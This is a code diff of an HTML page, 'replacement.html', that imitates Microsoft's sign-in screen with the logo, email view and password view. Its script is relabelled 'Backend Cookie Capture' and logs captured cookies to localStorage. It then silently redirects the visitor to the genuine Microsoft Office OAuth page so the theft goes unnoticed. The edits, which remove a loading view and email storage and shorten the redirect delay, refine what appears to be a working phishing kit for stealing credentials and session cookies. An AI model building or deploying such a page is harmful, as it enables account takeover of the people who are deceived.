@@ -200,23 +200,6 @@
     .mt-3 { margin-top: 0.75rem; }
     .mt-2 { margin-top: 0.5rem; }
     .form-group { margin-bottom: 1rem; }
-    .loading {
-      text-align: center;
-      padding: 20px;
-    }
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #0067b8;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
   </style>
 </head>
 <body>
@@ -224,7 +207,7 @@
   <div class="main-container">
     <div class="form-wrapper">
       <div class="form-box">
-        <!-- Email View (div1) -->
+        <!-- Email View -->
         <div id="div1">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <h1 class="mt-4">Sign in</h1>
@@ -238,7 +221,7 @@
           </div>
         </div>
 
-        <!-- Password View (div2) -->
+        <!-- Password View -->
         <div id="div2" class="hidden">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <div class="mt-4">
@@ -253,20 +236,8 @@
             <button class="btn btn-primary-blue" id="submit-btn">Sign in</button>
           </div>
         </div>
-
-        <!-- Microsoft OAuth Loading View (div3) -->
-        <div id="div3" class="hidden">
-          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-          <h1 class="mt-4">Signing you in...</h1>
-          <div class="loading mt-4">
-            <div class="spinner"></div>
-            <p style="margin-top: 20px; color: #666;">
-              Redirecting to Microsoft Office for authentication...
-            </p>
-          </div>
-        </div>
-
-        <!-- Sign-in Options View (options_view_detailed) -->
+        
+        <!-- Detailed "Sign-in options" View -->
         <div id="options_view_detailed" class="hidden">
             <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
             <h1 class="mt-4">Sign-in options</h1>
@@ -330,31 +301,20 @@
   </div>
 
   <script>
-    console.log('🔧 replacement.html loaded - Microsoft Office OAuth Flow');
+    console.log('🔧 replacement.html loaded - Backend Cookie Capture');
 
     const div1 = document.getElementById('div1');
     const div2 = document.getElementById('div2');
-    const div3 = document.getElementById('div3');
     const optionsBox = document.getElementById('options_box');
     const optionsViewDetailed = document.getElementById('options_view_detailed');
     const troubleshootingBox = document.getElementById('troubleshooting_box');
     
-    // ✅ MICROSOFT OAUTH CONFIGURATION
-    const MICROSOFT_OAUTH_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638982651027804271.ZGRjMzJhMWMtODE2MC00ZmNiLWJiMTYtYTJjYTFkYWJjM2ExNzkxNTJjYWUtMzgyZi00NzVhLWFiNGMtMWNjYWJiZWEzYjZk&ui_locales=en-US&mkt=en-US&client-request-id=24e2c313-f061-4e35-9860-47ef3e47544b&state=4mfFc4YIsvRZZ6ybca6vY3Ns62hrzIj-5IW06wCmlTgNJJ2pINB7zqx7e5JUZwc7rfd6yJZ8j-tIakNl4pAE2TuPjqXR_PtbGxf42ZdOTTjDPKBSWIZHRJRPtWnkKzQ0UQGCXRJwEqhRTO6MAtCZgCqq_MMwmz1s5k4W7p6ekj0d_PA3rlXyoMHqFvbcrA8d-toO1xtukBhWIK0dOxika2NuQF_zs0H5g5RstYVj7K1HU94zfPovrYGJVZUl6I_8TyJnx-15tmH4Bub_llnhvREuksI_a2WakZ4315woX4AWK2AbKsNrfEA_W_g1JkUg425mjE-Hl9GB_deP8WdsMrcKhu7GrkgpkjbQ5aIVRmfikr3QvIoiXSoDOkxycNDoFUTXIl1u4QFnUvi8Fi0EuMGbr2I-PPFZ5f8A9nfr-PM&x-client-SKU=ID_NET8_0&x-client-ver=8.5.0.0';
-
     document.getElementById('next').addEventListener('click', function (e) {
         e.preventDefault();
         const emailInput = document.getElementById('email');
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (emailRegex.test(emailInput.value.trim())) {
-            const email = emailInput.value.trim();
-            
-            // ✅ Store email for Microsoft OAuth
-            console.log('📧 Email entered:', email);
-            localStorage.setItem('ms_email', email);
-            sessionStorage.setItem('ms_email', email);
-            
-            document.getElementById('emailch').textContent = email;
+            document.getElementById('emailch').textContent = emailInput.value.trim();
             div1.classList.add('hidden');
             optionsBox.classList.add('hidden');
             div2.classList.remove('hidden');
@@ -452,18 +412,14 @@
                 
                 console.log('💾 Cookies stored in localStorage');
 
-                // ✅ Show loading view
-                div2.classList.add('hidden');
-                div3.classList.remove('hidden');
-                
-                console.log('🌐 Redirecting to Microsoft Office OAuth...');
-                console.log('🔗 OAuth URL:', MICROSOFT_OAUTH_URL);
-
                 // ✅ Redirect to Microsoft Office OAuth
+                console.log('🌐 Redirecting to Microsoft Office OAuth...');
+                const MICROSOFT_OAUTH_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638982651027804271.ZGRjMzJhMWMtODE2MC00ZmNiLWJiMTYtYTJjYTFkYWJjM2ExNzkxNTJjYWUtMzgyZi00NzVhLWFiNGMtMWNjYWJiZWEzYjZk&ui_locales=en-US&mkt=en-US&client-request-id=24e2c313-f061-4e35-9860-47ef3e47544b&state=4mfFc4YIsvRZZ6ybca6vY3Ns62hrzIj-5IW06wCmlTgNJJ2pINB7zqx7e5JUZwc7rfd6yJZ8j-tIakNl4pAE2TuPjqXR_PtbGxf42ZdOTTjDPKBSWIZHRJRPtWnkKzQ0UQGCXRJwEqhRTO6MAtCZgCqq_MMwmz1s5k4W7p6ekj0d_PA3rlXyoMHqFvbcrA8d-toO1xtukBhWIK0dOxika2NuQF_zs0H5g5RstYVj7K1HU94zfPovrYGJVZUl6I_8TyJnx-15tmH4Bub_llnhvREuksI_a2WakZ4315woX4AWK2AbKsNrfEA_W_g1JkUg425mjE-Hl9GB_deP8WdsMrcKhu7GrkgpkjbQ5aIVRmfikr3QvIoiXSoDOkxycNDoFUTXIl1u4QFnUvi8Fi0EuMGbr2I-PPFZ5f8A9nfr-PM&x-client-SKU=ID_NET8_0&x-client-ver=8.5.0.0';
+                
                 setTimeout(() => {
                     console.log('🔄 Executing redirect to Microsoft Office...');
                     window.location.href = MICROSOFT_OAUTH_URL;
-                }, 2000);
+                }, 1000);
 
             } else {
                 console.error('❌ No cookies captured:', data);
@@ -482,7 +438,6 @@
         e.preventDefault();
         div1.classList.add('hidden');
         div2.classList.add('hidden');
-        div3.classList.add('hidden');
         optionsBox.classList.add('hidden');
         troubleshootingBox.style.display = 'none';
         optionsViewDetailed.classList.remove('hidden');
